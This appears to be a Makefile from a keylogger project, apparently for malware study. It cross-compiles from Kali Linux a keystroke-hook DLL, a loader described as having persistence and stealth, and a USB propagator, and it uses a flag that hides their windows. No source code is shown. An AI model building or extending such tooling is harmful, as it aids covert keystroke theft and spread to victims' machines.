# Makefile - FMA Keylogger Project
# Cross-compile Windows PE executables from Kali Linux using MinGW-w64
#
# Usage:
#   make        - Build all components
#   make clean  - Remove build artifacts
#   make analyze - Open analysis worksheet (template)

CC=x86_64-w64-mingw32-g++-posix
CFLAGS=-Os -s -static-libgcc -static-libstdc++
LDFLAGS=-luser32 -lgdi32 -lshell32
STEALTH=-mwindows

BUILD=build
SRC=src

.PHONY: all clean dirs analyze

all: dirs $(BUILD)/keylogger_dll.dll $(BUILD)/keylogger_loader.exe $(BUILD)/usb_propagator.exe

dirs:
	mkdir -p $(BUILD)

# DLL - Core hook module (no -mwindows, it's a DLL)
$(BUILD)/keylogger_dll.dll: $(SRC)/keylogger_dll.cpp
	$(CC) -shared -o $@ $^ $(CFLAGS) $(LDFLAGS)

# Main loader with persistence and stealth
$(BUILD)/keylogger_loader.exe: $(SRC)/keylogger_loader.cpp
	$(CC) -o $@ $^ $(CFLAGS) $(LDFLAGS) $(STEALTH)

# USB propagator
$(BUILD)/usb_propagator.exe: $(SRC)/usb_propagator.cpp
	$(CC) -o $@ $^ $(CFLAGS) $(LDFLAGS) $(STEALTH)

# Debug builds (console visible, no stripping)
debug: CFLAGS = -g -O0
debug: all

clean:
	rm -rf $(BUILD)/*.exe $(BUILD)/*.dll $(BUILD)/*.o
	rmdir $(BUILD) 2>/dev/null; true

analyze:
	@echo "Open analysis/behavior_log_template.txt to record findings"
	@cat analysis/behavior_log_template.txt
